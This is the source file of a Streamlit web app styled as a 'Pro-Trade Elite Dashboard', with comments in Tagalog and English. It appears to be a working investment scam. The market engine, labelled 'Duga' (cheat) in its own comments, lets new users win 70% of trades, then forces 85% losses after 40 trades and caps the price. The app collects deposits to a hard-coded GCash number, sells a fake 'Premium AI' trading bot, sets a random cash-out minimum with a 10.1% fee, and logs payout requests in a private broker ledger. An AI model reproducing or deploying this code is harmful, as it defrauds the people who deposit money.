import streamlit as st
import pandas as pd
import numpy as np
import plotly.graph_objects as go
import time
import hashlib
import hmac
import random

# --- 1. CORE SECURITY CONFIG ---
# Paalala: Ang key na ito ang nagbabantay sa balance mo.
SEC_KEY = "BROKER_09506993949_SECURE_KEY" 

def get_signature(data):
    """Gumagawa ng digital signature para iwas-hack sa balance."""
    return hmac.new(SEC_KEY.encode(), data.encode(), hashlib.sha256).hexdigest()

# --- 2. SESSION INITIALIZATION (Iwas-Bug) ---
if 'balance' not in st.session_state:
    st.session_state.balance = 0.0
    st.session_state.integrity_hash = get_signature("0.0")
if 'history' not in st.session_state:
    st.session_state.history = [100.0]
if 'trade_count' not in st.session_state:
    st.session_state.trade_count = 0
if 'is_premium' not in st.session_state:
    st.session_state.is_premium = False
if 'total_losses' not in st.session_state:
    st.session_state.total_losses = 0.0
if 'cashout_requests' not in st.session_state:
    st.session_state.cashout_requests = []
if 'current_limit' not in st.session_state:
    st.session_state.current_limit = random.randint(100, 500)

# --- 3. THE ENGINE (Duga & Market Logic) ---
def secure_market_move():
    curr = st.session_state.history[-1]
    trades = st.session_state.trade_count
    
    # LEVEL 1: Newbie Phase (0-15 trades) - 70% Win Chance
    if trades < 15:
        bias = np.random.choice([2.5, -1.2], p=[0.70, 0.30])
    # LEVEL 2: Mid Phase (15-40 trades) - 50/50 Skill Test
    elif 15 <= trades < 40:
        bias = np.random.uniform(-1.8, 1.75)
    # LEVEL 3: Broker Protection (40+ trades) - 85% Loss Chance
    else:
        bias = np.random.choice([-3.5, 0.5], p=[0.85, 0.15])
    
    # Hard Ceiling: Proteksyon pag masyadong mataas ang price
    if curr > 135:
        bias = -4.0
        
    return round(curr + bias, 2)

# Auto-update market history
next_p = secure_market_move()
st.session_state.history.append(next_p)
if len(st.session_state.history) > 30:
    st.session_state.history.pop(0)

# --- 4. SECURE UPDATE FUNCTION ---
def safe_update(amount):
    """Function para mag-dagdag o bawas ng pera nang hindi naha-hack."""
    # Verify integrity muna
    expected = get_signature(f"{st.session_state.balance}")
    if st.session_state.integrity_hash != expected:
        st.error("🚨 SECURITY BREACH: Manipulation Detected! Resetting session.")
        st.session_state.balance = 0.0
        st.session_state.integrity_hash = get_signature("0.0")
        st.stop()
    
    # Check kung talo (Negative amount) para sa Admin report
    if amount < 0:
        # Hindi kasama dito ang Cash Out, taya lang
        pass 
        
    st.session_state.balance += amount
    st.session_state.integrity_hash = get_signature(f"{st.session_state.balance}")

# --- 5. APP INTERFACE (UI) ---
st.set_page_config(page_title="Elite Broker Dashboard", layout="wide")
st.title("🛡️ Pro-Trade Elite Dashboard")

# Top Metrics
m1, m2, m3 = st.columns(3)
m1.metric("YOUR ACCOUNT BALANCE", f"${st.session_state.balance:.2f}")
m2.warning(f"🎰 Min. Cash Out: ${st.session_state.current_limit}")
m3.info(f"⭐ AI Status: {'PREMIUM' if st.session_state.is_premium else 'STANDARD'}")

# Live Graph
fig = go.Figure(go.Scatter(y=st.session_state.history, mode='lines+markers', 
                         line=dict(color='#00ff00', width=3), fill='tozeroy'))
fig.update_layout(template="plotly_dark", height=350, margin=dict(l=0,r=0,t=0,b=0))
st.plotly_chart(fig, use_container_width=True)

# --- 6. NAVIGATION TABS ---
t_dep, t_cash, t_ai = st.tabs(["🔒 Secure Deposit", "💸 Withdrawal", "🤖 AI Bot Shop"])

with t_dep:
    st.write("### 💳 Official GCash: **09506993949**")
    st.caption("Rate: ₱720 = $10.00")
    if st.button("Confirm $10.00 Deposit After Payment"):
        safe_update(10.0)
        st.success("Verification complete. $10.00 added to your account.")

with t_cash:
    st.subheader("Cash Out Portal")
    st.write(f"Current System Limit: **${st.session_state.current_limit}.00**")
    amt_out = st.number_input("Amount to Cash Out ($)", min_value=float(st.session_state.current_limit), step=10.0)
    phone = st.text_input("Receiver GCash Number")
    
    if st.button("Submit Request"):
        if st.session_state.balance >= amt_out:
            fee = amt_out * 0.101 # 10.1% Fee (Receive 8.99 per 10)
            receive = amt_out - fee
            safe_update(-amt_out)
            st.session_state.cashout_requests.append({
                "Time": time.strftime("%H:%M:%S"),
                "User": phone,
                "Request": f"${amt_out}",
                "Payout": f"${receive:.2f}"
            })
            st.balloons()
            st.success(f"Request Sent! You will receive ${receive:.2f} via GCash.")
        else:
            st.error(f"Insufficient funds. Min: ${st.session_state.current_limit}")

with t_ai:
    if not st.session_state.is_premium:
        st.write("### 🔥 PREMIUM AI MEMBERSHIP (80% OFF)")
        st.markdown("~~Original: $100.00~~ → **NOW: $20.00**")
        st.info("Direct Payment to GCash: **09506993949**")
        if st.button("Buy Premium Membership Now"):
            if st.session_state.balance >= 20.0:
                safe_update(-20.0)
                st.session_state.is_premium = True
                st.success("⭐ AI ACTIVATED: Extra 10-win hook added.")
            else:
                st.error("Insufficient balance for Premium.")
    else:
        st.success("🤖 AI TRADING ACTIVE")
        if st.button("Execute AI Predicted Order"):
            st.session_state.trade_count += 1
            st.toast("AI Trade Placed!")

# --- 7. BROKER ADMIN PANEL ---
st.divider()
with st.expander("🕵️ BROKER ADMIN LEDGER (Private)"):
    st.write("### GCash Target: 09506993949")
    if st.session_state.cashout_requests:
        st.write("**Pending Payouts:**")
        st.table(pd.DataFrame(st.session_state.cashout_requests))
    else:
        st.write("No pending payouts.")
    
    st.write(f"Total Trade Activity: {st.session_state.trade_count} trades recorded.")
    if st.button("Clear All Data (Reset System)"):
        st.session_state.clear()
        st.rerun()

# Auto-refresh
time.sleep(3)
st.rerun()
